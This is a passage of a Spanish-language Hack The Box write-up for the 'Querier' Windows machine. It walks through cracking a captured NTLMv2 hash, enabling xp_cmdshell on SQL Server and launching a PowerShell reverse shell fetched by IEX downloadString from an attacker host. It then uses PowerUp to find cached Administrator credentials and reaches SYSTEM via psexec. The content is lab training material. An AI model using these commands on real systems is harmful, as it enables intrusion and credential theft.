+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:8bd4caf70224f8aebc7c79404049305d:0101000000000000800c9068ffabd701410f4a3dd8d7221300000000010010005a0077007100570073004c004b007900030010005a0077007100570073004c004b007900020010004100500068004f0064004c0050007500040010004100500068004f0064004c005000750007000800800c9068ffabd70106000400020000000800300030000000000000000000000000300000b58fdd1714e6ed624db2b7fbba1433facc61ba9747ccbeaf3c5b2e7f2aa100d40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>QUERIER<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.10.125,49694<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+</code></pre></div></div>
+
+<p>En nuestra máquina de atacante podemos un hash NTLMv2 el cual <strong>NO</strong> nos service para hacer <em>pass the hash</em>; pero podriamos tratar de crackearlo para ver la contraseña en texto claro. Por lo que creamos un archivo llamado <em>hash</em> en el cual pegamos el hash de NTLMv2 que vemos y ocupamos la herramienta <code class="language-plaintext highlighter-rouge">john</code>. En algunos casos es posible que <code class="language-plaintext highlighter-rouge">john</code> no pueda crackear el hash, en caso de que suceda, obtener un nuevo hash y tratar de crackearlo o hacer uso de <a href="https://github.com/SpiderLabs/Responder">Responder</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+corporate568     <span class="o">(</span>mssql-svc<span class="o">)</span>
+1g 0:00:00:30 DONE <span class="o">(</span>2021-09-17 15:10<span class="o">)</span> 0.03235g/s 289819p/s 289819c/s 289819C/s corpron50..corporal40
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Tenemos unas nuevas credenciales, por lo que pasamos a validarlas con <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.125 <span class="nt">-u</span> <span class="s1">'mssql-svc'</span> <span class="nt">-p</span> <span class="s1">'corporate568'</span> <span class="nt">-d</span> WORKGROUP
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\m</span>ssql-svc:corporate568
+</code></pre></div></div>
+
+<p>Ahora, intentamos conectarnos a <em>Microsoft SQL Server</em> con las nuevas credenciales y validamos si podemos ejecutar comandos a nivel de sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mssqlclient.py WORKGROUP/mssql-svc@10.10.10.125 <span class="nt">-windows-auth</span>
+/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="k">for </span>it is now deprecated <span class="k">in </span>cryptography, and will be removed <span class="k">in </span>the next release.
+  from cryptography import utils, x509
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: None, New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt; xp_cmdshell <span class="s2">"whoami"</span>
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">'sys.xp_cmdshell'</span> of component <span class="s1">'xp_cmdshell'</span> because this component is turned off as part of the security configuration <span class="k">for </span>this server. A system administrator can <span class="nb">enable </span>the use of <span class="s1">'xp_cmdshell'</span> by using sp_configure. For more information about enabling <span class="s1">'xp_cmdshell'</span>, search <span class="k">for</span> <span class="s1">'xp_cmdshell'</span> <span class="k">in </span>SQL Server Books Online.
+SQL&gt; sp_configure <span class="s2">"xp_cmdshell"</span>, 1
+<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
+SQL&gt; sp_configure <span class="s2">"show advanced"</span>, 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL&gt; reconfigure
+SQL&gt; sp_configure <span class="s2">"xp_cmdshell"</span>, 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL&gt; reconfigure
+SQL&gt; xp_cmdshell <span class="s2">"whoami"</span>
+output                                                                             
+
+<span class="nt">--------------------------------------------------------------------------------</span>   
+
+querier<span class="se">\m</span>ssql-svc                                                                  
+
+NULL                                                                               
+
+SQL&gt;
+</code></pre></div></div>
+
+<p>Explicamos un poco los comandos ejecutados. Primero tratamos de ejecutar un comando a nivel de sistema con <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>; sin embargo nos manda un error, por lo tanto tratamos de cambiar el valor de <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> de 0 a 1 con <code class="language-plaintext highlighter-rouge">sp_configure "xp_cmdshell, 1"</code>, pero otra vez nos sale otro error. A este punto cambiamos el valor de <code class="language-plaintext highlighter-rouge">show advanced</code> de 0 a 1, lo cual nos lo permite y aplicamos una reconfiguración para que se apliquen los cambios con <code class="language-plaintext highlighter-rouge">reconfigure</code>. Ahora nos queda cambiar el valor de <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> de 0 a 1, aplicamos un <code class="language-plaintext highlighter-rouge">reconfigure</code> y ya podemos ejecutar comando a nivel de sistema.</p>
+
+<p>Vamos a entablarnos una reverse shell, copiamos el archivo <em>Invoke-PowerShellTcp.ps1</em> a nuestro directorio de trabajo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+</code></pre></div></div>
+
+<p>Abrimos el archivo y al final agregamos la siguiente linea:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerShellTcp <span class="nt">-Reverse</span> <span class="nt">-IPAddress</span> 10.10.14.2 <span class="nt">-Port</span> 443
+</code></pre></div></div>
+
+<p>Nos compartimos un servidor HTTP con python, nos ponemos en escucha a través del puerto 443 y procedemos a ejecutar lo siguiente en la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; xp_cmdshell <span class="s2">"powershell IEX(New-Object Net.WebClient).downloadString(</span><span class="se">\"</span><span class="s2">http://10.10.14.2/PS.ps1</span><span class="se">\"</span><span class="s2">)"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.125 - - <span class="o">[</span>17/Sep/2021 15:50:09] <span class="s2">"GET /PS.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.125] 49702
+Windows PowerShell running as user mssql-svc on QUERIER
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>querier<span class="se">\m</span>ssql-svc
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Antes de hacer cualquier cosa, validamos si nos encontramos en un sistema de 64 bits y en un proceso igual:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Environment]::Is64BitOperatingSystem
+True
+<span class="o">[</span>Environment]::Is64BitProcess
+True
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>A este punto ya poder visualizar la flag (user.txt). Ahora solo falta escalar privilegios, por lo que empezamos a enumerar un poco el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State   
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>Observamos que tenemos el privilegio <strong>SeImpersonatePrivilege</strong> habilitado, por lo que ya sabemos tirar <strong>Juicy Potato</strong>; pero para cambiar un poco, vamos a descargar la siguiente utilidad para ver otra forma de escalar privilegios:</p>
+
+<p><a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/PowerShellMafia/PowerSploit
+Clonando en <span class="s1">'PowerSploit'</span>...
+remote: Enumerating objects: 3086, <span class="k">done</span><span class="nb">.</span>
+remote: Total 3086 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 3086
+Recibiendo objetos: 100% <span class="o">(</span>3086/3086<span class="o">)</span>, 10.47 MiB | 7.17 MiB/s, listo.
+Resolviendo deltas: 100% <span class="o">(</span>1809/1809<span class="o">)</span>, listo.
+❯ <span class="nb">cd </span>PowerSploit/Privesc/
+❯ ll
+.rw-r--r-- root root  26 KB Fri Sep 17 16:05:06 2021  Get-System.ps1
+.rw-r--r-- root root 586 KB Fri Sep 17 16:05:06 2021  PowerUp.ps1
+.rw-r--r-- root root 1.6 KB Fri Sep 17 16:05:06 2021  Privesc.psd1
+.rw-r--r-- root root  67 B  Fri Sep 17 16:05:06 2021  Privesc.psm1
+.rw-r--r-- root root 4.5 KB Fri Sep 17 16:05:06 2021  README.md
+</code></pre></div></div>
+
+<p>Abrimos el archivo <code class="language-plaintext highlighter-rouge">PowerUp.ps1</code> y al final agregamos la siguiente linea:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-AllChecks
+</code></pre></div></div>
+
+<p>Nos compartimos un servidor HTTP con python y procedemos a descargar el archivo a la máquina víctima:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.125 - - <span class="o">[</span>17/Sep/2021 16:11:59] <span class="s2">"GET /PowerUp.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s2">"http://10.10.14.2/PowerUp.ps1"</span><span class="o">)</span>                                               <span class="o">[</span>4/4]
+                                
+                                
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 2512
+ProcessId   : 1108    
+Name        : 1108                                              
+Check       : Process Token Privileges
+                                                                
+ServiceName   : UsoSvc
+Path          : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe <span class="nt">-k</span> netsvcs <span class="nt">-p</span>
+StartName     : LocalSystem                                     
+AbuseFunction : Invoke-ServiceAbuse <span class="nt">-Name</span> <span class="s1">'UsoSvc'</span>
+CanRestart    : True                                                                                                             
+Name          : UsoSvc                                          
+Check         : Modifiable Services                                                                                              
+                                                                                                                                 
+ModifiablePath    : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
+IdentityReference : QUERIER<span class="se">\m</span>ssql-svc  
+Permissions       : <span class="o">{</span>WriteOwner, Delete, WriteAttributes, Synchronize...<span class="o">}</span>                                         
+%PATH%            : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
+Name              : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
+Check             : %PATH% .dll Hijacks       
+AbuseFunction     : Write-HijackDll <span class="nt">-DllPath</span> <span class="s1">'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'</span>
+
+UnattendPath : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
+Name         : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
+Check        : Unattended Install Files
+                                                                
+Changed   : <span class="o">{</span>2019-01-28 23:12:48<span class="o">}</span>          
+UserNames : <span class="o">{</span>Administrator<span class="o">}</span>                                                                                                      
+NewName   : <span class="o">[</span>BLANK]         
+Passwords : <span class="o">{</span>MyUnclesAreMarioAndLuigi!!1!<span class="o">}</span>
+File      : C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\G</span>roup 
+            Policy<span class="se">\H</span>istory<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml
+Check     : Cached GPP Files
+</code></pre></div></div>
+
+<p>De los resultados observamos, vemos diferentes formas de escalar privilegios, <em>SeImpersonatePrivilege</em>, <em>UsoSvc</em>, <em>HijackDll</em> y tambien vemos las credenciales del usuarios <strong>Administrator</strong>.  Si no sabemos como escalar privilegios, podemos ir al siguiente link:</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">PayloadsAllTheThings</a></p>
+
+<p>Como tenemos credenciales, podemos probarlas con <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.125 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">-d</span> WORKGROUP
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.125    445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Observamos que nos pone un <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, por lo tanto podemos conectarnos a la máquina con <code class="language-plaintext highlighter-rouge">psexec.py</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/Administrator@10.10.10.125
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.125.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file svpJgbpv.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.125.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service vqjK on 10.10.10.125.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service vqjK.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.292]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ya somos administradores de la máquina y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-09-17T00:00:00-05:00">September 17, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-hawk/" class="pagination--pager" title="Hack The Box Hawk
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
